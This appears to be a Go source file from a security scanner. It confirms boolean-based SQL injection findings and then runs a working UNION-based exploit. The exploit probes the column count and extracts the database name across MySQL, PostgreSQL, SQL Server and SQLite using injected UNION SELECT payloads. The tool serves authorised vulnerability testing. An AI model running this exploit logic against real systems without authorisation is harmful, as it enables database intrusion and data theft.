package attack

import (
	"context"
	"fmt"
	"regexp"
	"strings"

	"github.com/JonasBorgesLM/security-scanner/internal/checks"
	"github.com/JonasBorgesLM/security-scanner/internal/core/model"
	"github.com/JonasBorgesLM/security-scanner/internal/ports"
)

func init() {
	Register(sqliConfirmer{})
}

// sqliNoiseSamples mirrors the check's own methodology: measure the
// endpoint's noise fresh, right now, rather than trusting whatever scan
// observed earlier. The target may have changed since scan ran; attack is
// a separate process invocation and cannot assume it hasn't.
const sqliNoiseSamples = 3

// sqliMaxColumns bounds the UNION column-count search. Six covers the
// overwhelming majority of real query shapes without turning "extract the
// database name" into dozens of requests against a target this tool exists
// to be gentle with.
const sqliMaxColumns = 6

// sqliMarkerPrefix/Suffix bracket whatever a UNION column returns, so the
// extracted value can be pulled out of a response with a single regex
// regardless of what HTML or JSON surrounds it — and so a column-count
// guess can be confirmed by looking for the bracketed constant instead of
// inferring success from status codes or response length, which is far
// less reliable across unknown backends.
const (
	sqliMarkerPrefix = "ATTACKPOC_"
	sqliMarkerSuffix = "_ENDPOC"
)

var sqliMarkerRe = regexp.MustCompile(regexp.QuoteMeta(sqliMarkerPrefix) + `(.*?)` + regexp.QuoteMeta(sqliMarkerSuffix))

// sqliExtractCandidates are tried in order once a working column count is
// found. CONCAT() is used to wrap each one because it exists, with
// automatic argument stringification, in both MySQL and PostgreSQL — the
// two engines this covers without the wrap syntax itself needing to branch
// per candidate.
var sqliExtractCandidates = []string{
	"database()",         // MySQL
	"current_database()", // PostgreSQL
	"DB_NAME()",          // SQL Server
	"sqlite_version()",   // SQLite has no database "name" the way the others do; version is the closest identifying string a UNION can pull out.
}

// sqliConfirmer confirms a sqli-boolean finding two ways: first by
// reproducing the same true/false comparison the check made (proof the
// finding is not a false positive left over from a target that has since
// changed), then, only once that holds, by attempting to extract the
// database name via a UNION-based read -- never a write, never a DROP or
// an UPDATE, just SELECT.
type sqliConfirmer struct{}

var _ Confirmer = sqliConfirmer{}

func (sqliConfirmer) CheckName() string { return "sqli-boolean" }

func (sqliConfirmer) Confirm(ctx context.Context, f model.Finding, client ports.HTTPClient) (model.Finding, error) {
	truePayload := f.Request.Payload
	falsePayload, ok := checks.FalsePayloadFor(truePayload)
	if !ok {
		return f, fmt.Errorf("no known false-condition payload is paired with %q", truePayload)
	}

	falseURL, err := withInjectedValue(f.Request.URL, f.Request.InjectedParam, truePayload, falsePayload)
	if err != nil {
		return f, fmt.Errorf("reconstructing the false-condition request: %w", err)
	}

	noise, falseSample, err := sqliNoiseFloor(ctx, client, f.Request.Method, falseURL)
	if err != nil {
		return f, fmt.Errorf("measuring noise: %w", err)
	}

	trueRes, err := get(ctx, client, f.Request.Method, f.Request.URL)
	if err != nil {
		return f, fmt.Errorf("replaying the original request: %w", err)
	}

	diff := absInt(len(trueRes.body) - len(falseSample))
	if diff <= noise {
		f.Evidence.ResponseSnippet = fmt.Sprintf(
			"did not reproduce: true/false response-length difference is %d bytes, within the %d-byte noise floor just measured — the finding may no longer hold, or the target has changed since scan",
			diff, noise)
		return f, nil
	}

	f.Confirmed = true
	f.Evidence.StatusCode = trueRes.status
	f.Evidence.ResponseSnippet = fmt.Sprintf(
		"reproduced: true/false response-length difference is %d bytes against a %d-byte noise floor", diff, noise)

	extractSQLiDatabaseName(ctx, client, &f, truePayload)
	return f, nil
}

// extractSQLiDatabaseName is best-effort: Confirmed is already true by the
// time this runs, from the reproduced boolean comparison alone, so a failed
// extraction here does not undo the confirmation — it just means this
// particular black-box technique didn't work against an engine it wasn't
// built to recognise. Whatever happens is appended to Evidence either way,
// so a report reader can see extraction was attempted.
func extractSQLiDatabaseName(ctx context.Context, client ports.HTTPClient, f *model.Finding, truePayload string) {
	quote := quoteStyleOf(truePayload)

	n, err := findSQLiColumnCount(ctx, client, f.Request.Method, f.Request.URL, f.Request.InjectedParam, truePayload, quote)
	if err != nil {
		f.Evidence.ResponseSnippet += "; UNION extraction: " + err.Error()
		return
	}
	if n == 0 {
		f.Evidence.ResponseSnippet += fmt.Sprintf("; UNION extraction: no working column count found up to %d", sqliMaxColumns)
		return
	}

	name, payload, url, err := extractSQLiValue(ctx, client, f.Request.Method, f.Request.URL, f.Request.InjectedParam, truePayload, quote, n)
	if err != nil {
		f.Evidence.ResponseSnippet += "; UNION extraction: " + err.Error()
		return
	}
	if name == "" {
		f.Evidence.ResponseSnippet += fmt.Sprintf("; UNION extraction: %d-column UNION accepted, but no candidate function returned a value", n)
		return
	}

	f.Evidence.ResponseSnippet += fmt.Sprintf("; UNION extraction recovered database name: %q", name)
	// The UNION request is the stronger artefact: it doesn't just infer a
	// vulnerability from a length difference, it shows the data it read.
	f.Request.URL = url
	f.Request.Payload = payload
}

// quoteStyleOf infers how to close the original query's string literal from
// the payload that worked, so the UNION continues the same syntax rather
// than guessing independently.
func quoteStyleOf(payload string) string {
	switch {
	case strings.HasPrefix(payload, "'"):
		return "'"
	case strings.HasPrefix(payload, `"`):
		return `"`
	default:
		return ""
	}
}

// sqliNoiseFloor repeats a request sqliNoiseSamples times and returns the
// largest body-length difference seen between any two of them, plus the
// last sample — the same methodology internal/checks/sqli.go uses at scan
// time, run fresh because the target may have moved on since then.
func sqliNoiseFloor(ctx context.Context, client ports.HTTPClient, method, rawURL string) (noise int, lastSample []byte, err error) {
	minLen, maxLen := -1, -1
	for range sqliNoiseSamples {
		res, err := get(ctx, client, method, rawURL)
		if err != nil {
			return 0, nil, err
		}
		n := len(res.body)
		if minLen == -1 || n < minLen {
			minLen = n
		}
		if n > maxLen {
			maxLen = n
		}
		lastSample = res.body
	}
	return maxLen - minLen, lastSample, nil
}

// sqliUnionValue builds a `' UNION SELECT ...-- -` payload with cols in the
// select list, closing the original literal with quote first.
func sqliUnionValue(quote string, cols []string) string {
	var b strings.Builder
	b.WriteString(quote)
	if quote != "" {
		b.WriteByte(' ')
	}
	b.WriteString("UNION SELECT ")
	b.WriteString(strings.Join(cols, ","))
	b.WriteString("-- -")
	return b.String()
}

// findSQLiColumnCount tries column counts 1..sqliMaxColumns, putting a
// constant wrapped in the extraction marker in the last column of each
// attempt. Finding the marker in the response proves three things in one
// request: the column count is right, CONCAT works against this engine,
// and the last column renders into the response body — exactly what
// extractSQLiValue needs to then swap the constant for a real expression.
func findSQLiColumnCount(ctx context.Context, client ports.HTTPClient, method, rawURL, injectedParam, oldValue, quote string) (int, error) {
	marker := fmt.Sprintf("CONCAT('%s','OK','%s')", sqliMarkerPrefix, sqliMarkerSuffix)

	for n := 1; n <= sqliMaxColumns; n++ {
		cols := nullColumns(n)
		cols[n-1] = marker

		testURL, err := withInjectedValue(rawURL, injectedParam, oldValue, sqliUnionValue(quote, cols))
		if err != nil {
			return 0, err
		}
		res, err := get(ctx, client, method, testURL)
		if err != nil {
			continue // this attempt failed to even complete; the next count might still work
		}
		if sqliMarkerRe.Match(res.body) {
			return n, nil
		}
	}
	return 0, nil
}

// extractSQLiValue tries each candidate expression in the last column of an
// n-column UNION, returning the first value recovered.
func extractSQLiValue(ctx context.Context, client ports.HTTPClient, method, rawURL, injectedParam, oldValue, quote string, n int) (value, payload, usedURL string, err error) {
	for _, candidate := range sqliExtractCandidates {
		cols := nullColumns(n)
		cols[n-1] = fmt.Sprintf("CONCAT('%s',%s,'%s')", sqliMarkerPrefix, candidate, sqliMarkerSuffix)
		attemptPayload := sqliUnionValue(quote, cols)

		testURL, buildErr := withInjectedValue(rawURL, injectedParam, oldValue, attemptPayload)
		if buildErr != nil {
			return "", "", "", buildErr
		}
		res, reqErr := get(ctx, client, method, testURL)
		if reqErr != nil {
			continue
		}
		m := sqliMarkerRe.FindSubmatch(res.body)
		if m == nil {
			continue
		}
		if got := string(m[1]); got != "" && got != "OK" {
			return got, attemptPayload, testURL, nil
		}
	}
	return "", "", "", nil
}

func nullColumns(n int) []string {
	cols := make([]string, n)
	for i := range cols {
		cols[i] = "NULL"
	}
	return cols
}
